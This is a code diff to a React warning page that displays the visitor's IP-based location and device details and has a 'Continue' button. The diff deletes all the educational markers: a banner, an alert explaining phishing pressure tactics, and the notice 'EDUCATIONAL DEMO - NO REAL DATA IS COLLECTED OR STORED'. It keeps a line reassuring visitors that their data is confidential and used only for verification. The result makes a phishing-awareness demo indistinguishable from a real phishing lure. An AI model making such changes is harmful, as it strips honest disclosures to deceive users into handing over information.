@@ -5,7 +5,6 @@ import { Button } from "@/components/ui/button";
 import { useIpLocation } from "@/hooks/useIpLocation";
 import { getBrowserAndOS } from "@/lib/utils";
 import { UserDeviceInfo } from "@/components/UserDevice";
-import { EducationalAlert, EducationalBanner } from "@/components/EducationalAlert";
 import { AlertTriangle } from "lucide-react";
 
 export default function WarningPage() {
@@ -19,8 +18,6 @@ export default function WarningPage() {
 
   return (
     <>
-      <EducationalBanner />
-      
       <Card className="w-full max-w-md bg-white rounded-lg shadow-md">
         <CardContent className="p-6">
           <div className="flex justify-center mb-6">
@@ -59,16 +56,11 @@ export default function WarningPage() {
           >
             Continue
           </Button>
-          
-          <EducationalAlert>
-            Real phishing attempts often create a sense of urgency and fear to make you act quickly without thinking.
-          </EducationalAlert>
         </CardContent>
       </Card>
 
       <div className="w-full max-w-md text-center mt-4 text-gray-500 text-xs">
         <p>Your information is used only for verification purposes. All data is confidential.</p>
-        <p className="mt-2 text-amber-600 font-medium">EDUCATIONAL DEMO - NO REAL DATA IS COLLECTED OR STORED</p>
       </div>
     </>
   );
